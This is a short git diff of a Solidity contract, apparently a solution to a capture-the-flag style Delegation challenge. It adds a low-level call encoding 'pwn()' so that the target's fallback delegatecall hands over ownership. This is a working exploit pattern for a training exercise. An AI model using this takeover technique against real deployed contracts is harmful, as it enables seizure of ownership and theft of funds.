@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.9;
 import "./Delegation.sol";
+import "hardhat/console.sol";
 
 contract AttackingDelegation {
     address public contractAddress;
@@ -11,5 +12,9 @@ contract AttackingDelegation {
 
     function hackContract() external {
         // Code me!
+
+        // execute delegation fallback function 
+          contractAddress.call(abi.encodeWithSignature("pwn()"));
+        
     }
 }
